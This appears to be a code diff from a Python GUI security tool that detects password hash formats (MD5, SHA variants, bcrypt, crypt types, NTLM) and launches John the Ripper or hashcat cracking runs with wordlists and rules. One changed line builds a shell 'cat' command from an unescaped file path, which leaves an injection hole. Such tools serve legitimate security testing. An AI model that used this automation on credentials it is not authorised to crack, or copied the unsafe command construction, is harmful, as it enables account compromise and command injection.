-            if hash_len == 32:
-                self.terminal.appendPlainText(f"Detected: MD5 (32 chars) — {wl_count} wordlists + rules\n")
-                self._execute_command(self._build_crack_cmd("john", filepath, "Raw-MD5"))
-            elif hash_len == 40:
-                self.terminal.appendPlainText(f"Detected: SHA1 (40 chars) — {wl_count} wordlists + rules\n")
-                self._execute_command(self._build_crack_cmd("john", filepath, "Raw-SHA1"))
-            elif hash_len == 64:
-                self.terminal.appendPlainText(f"Detected: SHA256 (64 chars) — {wl_count} wordlists + rules\n")
-                self._execute_command(self._build_crack_cmd("john", filepath, "Raw-SHA256"))
-            elif hash_len == 128:
-                self.terminal.appendPlainText(f"Detected: SHA512 (128 chars) — {wl_count} wordlists + rules\n")
-                self._execute_command(self._build_crack_cmd("john", filepath, "Raw-SHA512"))
-            elif first_line.startswith('$2') or first_line.startswith('$2b$'):
-                self.terminal.appendPlainText(f"Detected: bcrypt — {wl_count} wordlists + rules + brute force\n")
-                self._execute_command(self._build_crack_cmd("hashcat", filepath, "3200"))
-            elif first_line.startswith('$6$'):
-                self.terminal.appendPlainText(f"Detected: SHA512crypt — {wl_count} wordlists + rules + brute force\n")
-                self._execute_command(self._build_crack_cmd("hashcat", filepath, "1800"))
-            elif first_line.startswith('$5$'):
-                self.terminal.appendPlainText(f"Detected: SHA256crypt — {wl_count} wordlists + rules + brute force\n")
-                self._execute_command(self._build_crack_cmd("hashcat", filepath, "7400"))
-            elif first_line.startswith('$1$'):
-                self.terminal.appendPlainText(f"Detected: MD5crypt — {wl_count} wordlists + rules + brute force\n")
-                self._execute_command(self._build_crack_cmd("hashcat", filepath, "500"))
+            # 1. Check prefix-based hash types
+            for prefix, john_fmt, hc_mode, label, pref_tool in self.HASH_TYPES:
+                if first_line.startswith(prefix):
+                    self.terminal.appendPlainText(f"Detected: {label} — {wl_count} wordlists + rules\n")
+                    if pref_tool == "hashcat" and hc_mode != "None":
+                        self._execute_command(self._build_crack_cmd("hashcat", filepath, hc_mode))
+                    else:
+                        self._execute_command(self._build_crack_cmd("john", filepath, john_fmt))
+                    return
+
+            # 2. Check NTLM format (user:hash or just 32-char hex)
+            hash_part = first_line.split(':')[-1].strip() if ':' in first_line else first_line
+            hash_len = len(hash_part)
+
+            # Check if it's hex
+            is_hex = all(c in '0123456789abcdefABCDEF' for c in hash_part)
+
+            if is_hex and hash_len in self.HASH_LENGTHS:
+                john_fmt, hc_mode, label = self.HASH_LENGTHS[hash_len]
+                self.terminal.appendPlainText(f"Detected: {label} ({hash_len} hex chars) — {wl_count} wordlists + rules\n")
+                # Use hashcat for fast hashes (MD5, SHA1, SHA256, NTLM), john for others
+                if hash_len <= 64:
+                    self._execute_command(self._build_crack_cmd("hashcat", filepath, hc_mode))
+                else:
+                    self._execute_command(self._build_crack_cmd("john", filepath, john_fmt))
             else:
-                self.terminal.appendPlainText(f"Unknown hash type ({hash_len} chars) — trying all methods\n")
+                self.terminal.appendPlainText(f"Unknown hash type ({hash_len} chars) — trying john auto-detect\n")
                 self._execute_command(self._build_crack_cmd("john", filepath))
 
         elif ext in ('.csv', '.xml'):
-            # Scan results
             self.terminal.appendPlainText(f"\n⚡ Showing {fname}...\n")
             self._execute_command(f"cat '{filepath}' | head -100")
 
         else:
-            # Unknown — let AI decide
             self._ai_execute(f"analyze this file: {filepath}")
 
     def _on_stop(self):
